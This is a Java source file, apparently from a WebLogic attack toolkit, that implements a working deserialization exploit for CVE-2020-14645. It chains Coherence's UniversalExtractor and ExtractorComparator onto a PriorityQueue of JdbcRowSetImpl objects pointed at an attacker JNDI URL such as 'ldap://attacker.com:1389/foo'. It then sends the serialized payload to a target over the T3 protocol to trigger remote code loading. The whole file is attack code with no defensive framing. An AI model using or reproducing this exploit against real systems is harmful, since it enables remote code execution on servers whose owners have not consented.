package org.weblogic.exploit;

import com.sun.rowset.JdbcRowSetImpl;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.UniversalExtractor;
import org.weblogic.exploit.annotation.Gadget;
import org.weblogic.serial.Reflections;
import org.weblogic.serial.Serializer;
import org.weblogic.weblogic.T3ProtocolOperation;

import java.util.PriorityQueue;

//UniversalExtractor
//CVE-2020-14645
@Gadget(cve = "CVE-2020-14645", command = "ldap://attacker.com:1389/foo", description = "JNDI callback", osCommand = false)
public class Coherence4 implements Exploit {

    public Object exploit(final String command) throws Exception {
        if (!command.startsWith("ldap://") && !command.startsWith("rmi://")) {
            System.out.println("Command invalid. Example: ldap://attacker.com:1389/foo");
            System.exit(0);
        }
        UniversalExtractor extractor = new UniversalExtractor("DatabaseMetaData");
        ExtractorComparator comparator = new ExtractorComparator();
        Reflections.setFieldValue(comparator, "m_extractor", extractor);
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, null);
        queue.add(1);
        queue.add(1);
        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName(command);
        queueArray[0] = jdbcRowSet;
        queueArray[1] = jdbcRowSet;
        //add comparator for queue
        Reflections.setFieldValue(queue, "comparator", comparator);
        return queue;
    }

    @Override
    public void exploit(String host, String port, String command) throws Exception {
        if (!command.startsWith("ldap://") && !command.startsWith("rmi://")) {
            System.out.println("Command invalid. Example: ldap://attacker.com:1389/foo");
            System.exit(0);
        }
        UniversalExtractor extractor = new UniversalExtractor("DatabaseMetaData");
        ExtractorComparator comparator = new ExtractorComparator();
        Reflections.setFieldValue(comparator, "m_extractor", extractor);
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, null);
        queue.add(1);
        queue.add(1);
        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName(command);
        queueArray[0] = jdbcRowSet;
        queueArray[1] = jdbcRowSet;
        //add comparator for queue
        Reflections.setFieldValue(queue, "comparator", comparator);
        T3ProtocolOperation.send(host, port, Serializer.serialize(queue));
    }
}